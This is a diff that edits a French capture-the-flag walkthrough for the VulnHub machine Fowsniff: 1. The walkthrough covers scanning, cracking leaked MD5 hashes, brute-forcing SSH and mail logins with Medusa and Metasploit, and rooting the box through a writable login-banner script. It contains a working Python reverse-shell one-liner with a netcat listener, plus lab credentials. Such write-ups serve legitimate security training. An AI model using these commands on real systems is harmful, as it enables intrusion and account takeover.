@@ -1,10 +1,10 @@
 # Fowsniff: 1
 
-[Fowsniff: 1](https://www.vulnhub.com/entry/fowsniff-1,262/) est une machine virtuelle vulnérable, conçue par Ben Berkowitz alias [berzerk0](https://berzerk0.github.io/GitPage/) en 2017, et publiée sur VulnHub au mois de septembre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Fowsniff: 1](https://www.vulnhub.com/entry/fowsniff-1,262/) est une machine virtuelle vulnérable, conçue par Ben Berkowitz alias [berzerk0](https://berzerk0.github.io/GitPage/) en 2017 et publiée sur VulnHub au mois de septembre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
 ## Recherche d'informations
 
-Pour commencer, l'outil netdiscover est utilisé afin de retrouver l'adresse IP de la VM Fowsniff : il s'agit de 192.168.56.101.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Fowsniff : il s'agit de 192.168.56.101.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -19,7 +19,7 @@ _____________________________________________________________________________
 192.168.56.101  08:00:27:66:85:17      1      60  PCS Systemtechnik GmbH
 ```
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH (port 22) au serveur Fowsniff ; un serveur Web Apache est par ailleurs installé, accessible via le port 80, peut-être un site vitrine comme lors des précédents CTF résolus, [Raven: 2](/CTF-VulnLabs/raven2) et [Bulldog: 2](/CTF-VulnLabs/bulldog2) ? Enfin, un serveur de messagerie [Dovecot](https://en.wikipedia.org/wiki/Dovecot_(software)) ([IMAP](https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol) et [POP3](https://en.wikipedia.org/wiki/Post_Office_Protocol)) semble être installé, les ports 110 et 143 étant ouverts.
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH (port 22) au serveur Fowsniff ; un serveur Web Apache est par ailleurs installé, accessible via le port 80, peut-être un site vitrine comme lors des précédents CTF résolus, [Raven: 2](/CTF-VulnLabs/raven2) et [Bulldog: 2](/CTF-VulnLabs/bulldog2) ? Enfin, un serveur de messagerie [Dovecot](https://en.wikipedia.org/wiki/Dovecot_(software)) ([IMAP](https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol) et [POP3](https://en.wikipedia.org/wiki/Post_Office_Protocol)) semble être installé, les ports 110 et 143 étant ouverts.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.101
@@ -39,15 +39,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Direction le port 80 et... ouille ouille ouille... tout comme [Bulldog Industries](/CTF-VulnLabs/bulldog1), FowSniff Corp. a été la cible d'un piratage informatique ; le site Web de l'entreprise est temporairement en maintenance et un court message a été adressé aux clients. Une personne malveillante a pu exploiter une vulnérabilité sur le réseau interne de FowSniff Corp. et dérober des informations relatives aux employés de l'entreprise (logins et mots de passe). Par chance, nous explique-t-on, aucune donnée cliente n'a été volée. Tous les employés ont néanmoins reçu comme consigne de changer illico presto leurs mots de passe.
 
-![Affichage de l'image Website-FowSniffCorp.PNG](Website-FowSniffCorp.PNG)
+![Affichage de l'image Website-FowSniffCorp.PNG](images/Website-FowSniffCorp.png)
 
-D'autre part, le compte Twitter [@fowsniffcorp](https://twitter.com/FowsniffCorp) de l'entreprise a lui aussi été piraté. L'un des employés utilisait-il le même mot de passe partout ? Quoi qu'il en soit, tous les tweets précédents ont été effacés, et les informations volées ont été diffusées via ce canal d'informations. Voyons voir... 7 tweets et 2 abonnements, l'un au créateur du CTF [@berzerk0](https://twitter.com/berzerk0) et l'autre au compte [@WorstPasswords](https://twitter.com/WorstPasswords), histoire d'appuyer là où ça fait mal.
+D'autre part, le compte Twitter [@fowsniffcorp](https://twitter.com/FowsniffCorp) de l'entreprise a lui aussi été piraté. L'un des employés utilisait-il le même mot de passe partout ? Quoi qu'il en soit, tous les tweets précédents ont été effacés, et les informations volées ont été diffusées via ce canal d'informations. Voyons voir... sept tweets et deux abonnements, l'un au créateur du CTF [@berzerk0](https://twitter.com/berzerk0) et l'autre au compte [@WorstPasswords](https://twitter.com/WorstPasswords), histoire d'appuyer là où ça fait mal.
 
-![Affichage de l'image Twitter-FowSniffCorp.PNG](Twitter-FowSniffCorp.PNG)
+![Affichage de l'image Twitter-FowSniffCorp.PNG](images/Twitter-FowSniffCorp.png)
 
-Le tweet épinglé du compte @fowsniffcorp renvoie [vers un lien Pastebin](https://pastebin.com/NrAqVeeX), où un dénommé B1gN1nj4 se vante d'avoir piraté le site de FowSniff Corp. En tout, neuf adresses e-mail de l'entreprise ont fuité, accompagnées de leurs mots de passe hashés en MD5. B1gN1nj4 évoque également le serveur de messagerie (vu lors du scan nmap), qui devrait donc être une cible de choix et un élément de la résolution de cette VM. Voyons voir ce que [John The Ripper](http://openwall.com/john/) parviendra à faire de tous ces hashs ; notre [dictionnaire préféré](https://wiki.skullsecurity.org/Passwords) est appelé à la rescousse : Rockyou.
+Le tweet épinglé du compte @fowsniffcorp renvoie [vers un lien Pastebin](https://pastebin.com/NrAqVeeX), où un dénommé B1gN1nj4 se vante d'avoir piraté le site de FowSniff Corp. En tout, neuf adresses e-mail de l'entreprise ont fuité, accompagnées de leurs mots de passe hashés en MD5. B1gN1nj4 évoque également le serveur de messagerie (vu lors du scan nmap), qui devrait donc être une cible de choix et un élément de la résolution de cette VM. Voyons voir ce que [__John The Ripper__](http://openwall.com/john/) parviendra à faire de tous ces hashs ; notre [dictionnaire préféré](https://wiki.skullsecurity.org/Passwords) est appelé à la rescousse : rockyou.txt !
 
-![Affichage de l'image Pastebin-Password-Leak.PNG](Pastebin-Password-Leak.PNG)
+![Affichage de l'image Pastebin-Password-Leak.PNG](images/Pastebin-Password-Leak.png)
 
 ```console
 root@blinils:~# john leak-pastebin.passwords --wordlist=rockyou.txt --format=Raw-MD5
@@ -81,7 +81,6 @@ seina@fowsniff:scoobydoo2
 mursten@fowsniff:carp4ever
 parede@fowsniff:orlando12
 sciana@fowsniff:07011972
-
 8 password hashes cracked, 1 left
 
 root@blinils:~# # pour supprimer les deux dernières lignes du fichier
@@ -117,9 +116,9 @@ sciana 07011972
 root@blinils:~# sed -e "s/@fowsniff:/ /g" < leak-pastebin.john > fowsniff.credentials
 ```
 
-## Par où est entré B1gN1nj4 ? 22 ou 110 ?
+## Cassage de mots de passe avec Medusa
 
-Plutôt que de tester toutes les combinaisons à la main, l'outil [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html) arrive à la rescousse ! Soit soixante-quatre combinaisons possibles à tester... c'est vrai, après tout, pourquoi les employés ne partageraient-ils pas leurs mots de passe entre eux ?
+Plutôt que de tester toutes les combinaisons à la main, l'outil [__Medusa__](http://foofus.net/goons/jmk/medusa/medusa.html) arrive à la rescousse ! Soit soixante-quatre combinaisons possibles à tester... c'est vrai, après tout, pourquoi les employés ne partageraient-ils pas leurs mots de passe entre eux ?
 
 ```console
 root@blinils:~# medusa -h 192.168.56.101 -U fowsniff.users -P fowsniff.passwords -M ssh
@@ -129,7 +128,7 @@ ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: bilbo101 (2 of 8 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: apples01 (3 of 8 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: skyler22 (4 of 8 complete)
---REDACTED--
+--snip--
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: sciana (8 of 8, 7 complete) Password: skyler22 (4 of 8 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: sciana (8 of 8, 7 complete) Password: scoobydoo2 (5 of 8 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: sciana (8 of 8, 7 complete) Password: carp4ever (6 of 8 complete)
@@ -148,16 +147,16 @@ ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 o
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: apples01 (3 of 8 complete)
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: skyler22 (4 of 8 complete)
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mauer (1 of 8, 0 complete) Password: scoobydoo2 (5 of 8 complete)
---REDACTED--
+--snip--
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: seina (5 of 8, 4 complete) Password: skyler22 (4 of 8 complete)
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: seina (5 of 8, 4 complete) Password: scoobydoo2 (5 of 8 complete)
 ACCOUNT FOUND: [imap] Host: 192.168.56.101 User: seina Password: scoobydoo2 [SUCCESS]
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mursten (6 of 8, 5 complete) Password: mailcall (1 of 8 complete)
 ACCOUNT CHECK: [imap] Host: 192.168.56.101 (1 of 1, 0 complete) User: mursten (6 of 8, 5 complete) Password: bilbo101 (2 of 8 complete)
---REDACTED--
+--snip--
 ```
 
-Bingo ! On retrouve le même résultat avec le module _pop3_login_ de Metasploit.
+Bingo ! On retrouve le même résultat avec le module ```pop3_login``` de Metasploit.
 
 ```console
 root@blinils:~# msfconsole --quiet
@@ -188,7 +187,7 @@ msf auxiliary(scanner/pop3/pop3_login) > run
 [*] Auxiliary module execution completed
 ```
 
-Nous pouvons nous connecter au serveur de messagerie avec les credentials _seina_/_scoobydoo2_ !
+Nous pouvons nous connecter au serveur de messagerie avec les credentials ```seina:scoobydoo2``` !
 
 ## Résultat du match : Pneumonie 2 - Sécurité 0
 
@@ -205,7 +204,7 @@ PASS scoobydoo2
 +OK Logged in.
 ```
 
-À présent, y a-t-il des mails présents sur le serveur ? Et si oui, quels sont-ils ? _STAT_ et _RETR_ feront l'affaire.
+À présent, y a-t-il des mails présents sur le serveur ? Et si oui, quels sont-ils ? ```STAT``` et ```RETR``` feront l'affaire.
 
 ```console
 STAT
@@ -262,7 +261,7 @@ OK, ce premier mail est d'ores et déjà une mine d'or et regorge d'informations
 
 D'après les tweets publiés sur le compte @FowsniffCorp, la fuite de données a été rendue publique entre le 8 et le 9 mars 2018. Quatre jours plus tard, le 13 mars 2018, A.J Stone, probablement le sysadmin de l'équipe — en tout cas d'après B1gN1nj4 sur Twitter — a écrit à tous ses collègues pour leur signifier les raisons de la fuite de données. In fine, l'attaquant a exploité une [injection SQL](https://www.owasp.org/index.php/SQL_Injection) sur le formulaire d'authentification du site, et a pu récupérer l'intégralité de la base de données dont les mots de passe hashés des e-mails {at}fowsniff.
 
-Et la cerise sur le gâteau, le mot de passe établi par défaut pour se connecter en SSH est divulgué en clair, dans le mail. À noter que c'est ce fameux _stone_ qui est le seul des neuf à avoir un mot de passe suffisamment robuste... en tout cas, qui n'est pas listé dans rockyou.txt.
+Et la cerise sur le gâteau, le mot de passe établi par défaut pour se connecter en SSH est divulgué en clair, dans le mail. À noter que c'est ce fameux ```stone``` qui est le seul des neuf à avoir un mot de passe suffisamment robuste... en tout cas, qui n'est pas listé dans rockyou.txt.
 
 ```
 RETR 2
@@ -361,9 +360,9 @@ baksteen@fowsniff:~$ id
 uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
 ```
 
-## Sniff... c'est déjà bientôt fini !
+## Élévation de privilèges avec cube.sh
 
-Après plusieurs pérégrinations qui n'ont rien donné — pas de droits sudo pour l'utilisateur _baksteen_, des exploits recommandés par le script [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester) qui ne sont pas compatibles, le binaire gcc pas installé sur le serveur FowSniff, un fichier _term.txt_ au contenu bien mystérieux et j'en passe... — la solution a finalement pointé le bout de son nez, via une commande qui liste les fichiers appartenant au groupe _users_ dont _baksteen_ fait partie.
+Après plusieurs pérégrinations qui n'ont rien donné — pas de droits sudo pour l'utilisateur ```baksteen```, des exploits recommandés par le script [__linux-exploit-suggester.sh__](https://github.com/mzet-/linux-exploit-suggester) qui ne sont pas compatibles, le binaire gcc pas installé sur le serveur FowSniff, un fichier ```term.txt``` au contenu bien mystérieux et j'en passe... — la solution a finalement pointé le bout de son nez, via une commande qui liste les fichiers appartenant au groupe ```users``` dont ```baksteen``` fait partie.
 
 ```console
 baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null -not -path "/proc/*"
@@ -387,7 +386,7 @@ baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null -not -path "/proc/*
 --snip-
 ```
 
-On y retrouve l'énigmatique _term.txt_... mais qui est donc cette personne ayant inventé l'expression "One Hit Wonder" ? [William Shatner](https://en.wikipedia.org/wiki/William_Shatner) ? On y retrouve également nos fichiers uploadés LinEnum.sh et linux-exploit-suggester.sh, mais surtout un fichier _/opt/cube/cube.sh_ particulièrement alléchant !
+On y retrouve l'énigmatique ```term.txt```... mais qui est donc cette personne ayant inventé l'expression _One Hit Wonder_ ? [William Shatner](https://en.wikipedia.org/wiki/William_Shatner) ? On y retrouve également nos fichiers uploadés __```LinEnum.sh```__ et __```linux-exploit-suggester.sh```__, mais surtout un fichier ```/opt/cube/cube.sh``` particulièrement alléchant !
 
 ```console
 baksteen@fowsniff:~$ ls -al /opt/cube/
@@ -415,7 +414,7 @@ printf "
 baksteen@fowsniff:/opt/cube$
 ```
 
-Tiens c'est amusant, on dirait la bannière d'accueil SSH lors de notre connexion en tant que _baksteen_. Vérifions cela...
+Tiens c'est amusant, on dirait la bannière d'accueil SSH lors de notre connexion en tant que ```baksteen```. Vérifions cela...
 
 ```console
 baksteen@fowsniff:~$ cat /etc/motd
@@ -424,13 +423,13 @@ cat: /etc/motd: No such file or directory
 baksteen@fowsniff:~$ cat /etc/pam.d/sshd
 # PAM configuration for the Secure Shell service
 
---REDACTED--
+--snip--
 # Print the message of the day upon successful login.
 # This includes a dynamically generated part from /run/motd.dynamic
 # and a static (admin-editable) part from /etc/motd.
 session    optional     pam_motd.so  motd=/run/motd.dynamic
 session    optional     pam_motd.so noupdate
---REDACTED--
+--snip--
 
 baksteen@fowsniff:~$ cat /run/motd.dynamic
 
@@ -442,7 +441,7 @@ baksteen@fowsniff:~$ cat /run/motd.dynamic
  * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
 ```
 
-La bannière de connexion est bel et bien composée de deux éléments, /run/motd.dynamic et /opt/cube/cube.sh. Ce dernier est modifiable à souhait, nous avons les droits d'écriture sur ce fichier. Mais le script est-il exécuté en tant que _root_ ?
+La bannière de connexion est bel et bien composée de deux éléments, ```/run/motd.dynamic``` et ```/opt/cube/cube.sh```. Ce dernier est modifiable à souhait, nous avons les droits d'écriture sur ce fichier. Mais le script est-il exécuté en tant que ```root``` ?
 
 ```console
 baksteen@fowsniff:~$ echo 'usr/bin/id' > /opt/cube/cube.sh
@@ -465,7 +464,7 @@ uid=0(root) gid=0(root) groups=0(root)
 Last login: Mon Nov 26 17:17:17 2018 from 192.168.56.102
 ```
 
-Oui oui oui, mille fois oui ! Un reverse shell avec Python fera parfaitement l'affaire (et avec python3, c'est encore mieux !). ```nc -nlvp 12345``` sur notre machine, ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` dans le fichier cube.sh et nous obtenons notre shell, après la connexion réussie et l'exécution du fichier cube.sh pour la bannière d'accueil !
+Oui oui oui, mille fois oui ! Un _reverse shell_ avec Python fera parfaitement l'affaire (et avec python3, c'est encore mieux !). ```nc -nlvp 12345``` sur notre machine, ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` dans le fichier ```cube.sh``` et nous obtenons notre shell, après la connexion réussie et l'exécution du fichier ```cube.sh``` pour la bannière d'accueil !
 
 ```console
 baksteen@fowsniff:~$ vi /opt/cube/cube.sh
@@ -479,7 +478,7 @@ root@blinils:~# ssh baksteen@192.168.56.101
 baksteen@192.168.56.101's password: 
 ```
 
-Au même moment dans un autre terminal, on récupère la connexion en tant que _root_... et le flag tant convoité !
+Au même moment dans un autre terminal, on récupère la connexion en tant que ```root``` et par la même occasion le flag tant convoité !
 
 ```console
 root@blinils:~# nc -nlvp 12345
@@ -500,4 +499,4 @@ Special thanks to psf, @nbulischeck and the whole Fofao Team.
 
 ## Conclusion
 
-Ce CTF était vraiment très plaisant à résoudre. J'aime beaucoup ce type de VM avec un scénario réaliste ; en l'occurrence, @berzerk0 a particulièrement soigné les détails : création d'un compte Twitter, mise en place d'un Pastebin, rédaction des e-mails... tout était ordonné et très bien ficelé ! Un grand merci à @berzerk0 pour la confection de cette VM !
+Ce CTF était vraiment très plaisant à résoudre. J'aime beaucoup ce type de VM avec un scénario réaliste ; en l'occurrence, [berzerk0](https://berzerk0.github.io/GitPage/) a particulièrement soigné les détails : création d'un compte Twitter, mise en place d'un Pastebin, rédaction des e-mails... tout était ordonné et très bien ficelé ! Un grand merci à Ben Berkowitz pour la confection de cette VM !
